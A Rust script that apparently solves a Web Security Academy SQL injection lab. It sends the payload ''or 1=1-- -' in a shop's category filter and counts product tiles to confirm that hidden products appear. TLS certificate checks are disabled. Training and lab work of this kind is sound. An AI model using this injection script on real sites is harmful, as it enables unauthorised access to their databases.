use reqwest::Client;
use scraper::{Html, ElementRef, Selector};
use std::error::Error;
use urlencoding::encode;

/*
Find the first <section> whose class attribute is exactly container-list-tiles. 
If found, count how many direct children of that section are <div> elements (ignore text/comments/other tags) 
and return that number; if no such section exists, return 0 
*/
fn getNumberOfReleasedProducts(html_text: &str)-> usize{
    let document = Html::parse_document(html_text); //parse the html provided
    //get the section with class name container-list-tiles
    let section_header=Selector::parse(r#"section[class="container-list-tiles"]"#).unwrap();
    // run the selector against the parsed document to return an iterator against the matching elements
    if let Some(section) = document.select(&section_header).next() { 
        section
            // returns an iterator over all child nodes of that section element â€” that includes element nodes (<div>, <span>), etc
            .children()
            // filters the iterator using the provided closure. Only children for which the closure returns true are kept
            .filter(|child| {
                child
                    .value()
                    .as_element()
                    .map(|el| el.name.local.as_ref() == "div")
                    .unwrap_or(false)
            })
            .count()
    } else {
        0
    }
}



#[tokio::main] // needed to enable async programming
async fn main()-> Result<(), Box<dyn Error>> { // returns a result and catches errors
    let host="https://0a84006603501a7e814b11da00ae0055.web-security-academy.net";
    let client=Client::builder() // build the request client
    .danger_accept_invalid_certs(true) // basically verify=false => accept invalid TLS/SSL errors
    .build()?;// returns a Client structure
    let mut r=client.get(host).send().await?; // constructs a get request and send it asynchronously. the ? if for catching network errors
    let request_html=r.text().await?;
    let initial_number_of_products=getNumberOfReleasedProducts(&request_html);
    let payload = "'or 1=1-- -";
    let endpoint=format!("{}/filter", host);
    let injected_text = client.get(&endpoint)
        .query(&[("category", payload)])
        .send().await?
        .text().await?;
    r=client.get(host).send().await?;
    if getNumberOfReleasedProducts(&injected_text) > initial_number_of_products{
        println!("[+] Lab Solved LESSGOOOOO");
    }
    else{
        println!("Try harder noob!");
    }
    Ok(())
}
